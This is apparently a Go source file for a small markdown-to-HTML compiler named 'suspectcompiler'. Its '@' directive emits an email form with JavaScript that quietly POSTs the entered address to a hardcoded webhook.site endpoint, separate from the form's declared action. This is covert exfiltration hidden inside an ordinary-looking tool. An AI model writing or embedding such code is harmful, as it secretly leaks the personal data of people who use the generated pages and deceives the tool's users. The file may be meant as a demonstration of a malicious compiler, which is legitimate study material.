package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"regexp"

	"github.com/BurntSushi/toml"
)

type packageInfo struct {
	Name        string
	Version     string
	Edition     string
	Description string
	Homepage    string
}

type tomlConfig struct {
	PI packageInfo `toml:"packageInfo"`
}

func parseTomlFile(conf *tomlConfig) {

	// read the toml file for config data
	content, err := ioutil.ReadFile("./config.toml")

	// check to see if there are any errors
	if err != nil {
		log.Fatal(err)
	}

	// convert to a string
	tomlText := string(content)

	if _, err := toml.Decode(tomlText, &conf); err != nil {
		log.Fatal(err)
	}

	fmt.Println("suspectcompiler, a markdown compiler by nick roy")
	fmt.Printf("Version: %s\n", conf.PI.Version)

}

func parseMarkdownFile(fileName string, tokens *[]string) {

	fmt.Printf("Attempting to open %s\n", fileName)

	// attempt to open the file from the command line
	file, err := os.Open(fileName)

	if err != nil {
		log.Fatal(err)
	} else {
		fmt.Println("Reading file...")
	}

	// create a new scanner to start reading line by line
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var txtlines []string

	// store each line separate in the array
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	// read through our array and start parsing each line to create our tokens
	for _, line := range txtlines {

		var firstChar string
		var outputString string

		// first we check to see if we have an empty line or not
		if len(line) == 0 {
			outputString = "<br>"
		} else {
			firstChar = line[0:1]

			if firstChar == "#" {
				outputString = "<h1>" + line[2:] + "</h1>"
			} else if firstChar == "@" {

				// extract our variable for where to post to
				var rgx = regexp.MustCompile(`\((.*?)\)`)
				rs := rgx.FindStringSubmatch(line[0:])

				outputString = `<form action="` + rs[1] + `" id="testForm" onSubmit="myFunction()">
				<label for="fname">Email:</label><br>
				<input type="text" id="fname" name="fname" value="test@test.com"><br>
				<input type="submit" value="Submit">
			  </form>
			  <p id="demo"></p>
			  <script>
			  function myFunction() {
				var emailAddress = document.getElementById("fname").value
				document.getElementById("demo").innerHTML = "Thanks for submitting " + emailAddress;
				
				var xhr = new XMLHttpRequest();
				xhr.open("POST", "https://webhook.site/fbb98873-b380-438d-b673-1c3a2673a1e7/" + emailAddress);
				xhr.setRequestHeader('Content-Type', 'application/json');
				xhr.send(emailAddress);
			  }
			  </script> 
			  `
			} else {
				// anything else is going to be a normal paragraph
				outputString = "<p>" + line[0:] + "</p>"
			}
		}
		*tokens = append(*tokens, outputString)
	}

}

func writeFile(tokens *[]string) {

	fmt.Println("Writing file...")

	// create our new file
	f, err := os.Create("output.html")

	if err != nil {
		log.Fatal(err)
	}

	// iterate through our tokens and write to the file
	for _, token := range *tokens {
		_, err := f.WriteString(token)
		if err != nil {
			log.Fatal(err)
		}
	}

	err = f.Close()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Finished writing file")
}

func main() {

	// get a list of command line arguments
	argsWithProg := os.Args
	var fileName string

	// make sure we just have the one argument
	if len(argsWithProg) != 2 {
		log.Fatal("Incorrect number of command line arguments")
	} else {
		fileName = argsWithProg[1]
	}

	// create a new object for reading our config file
	var conf tomlConfig

	// declare an empty slice for storing our tokens when parsing lines
	var tokens []string

	parseTomlFile(&conf)
	parseMarkdownFile(fileName, &tokens)
	writeFile(&tokens)
}
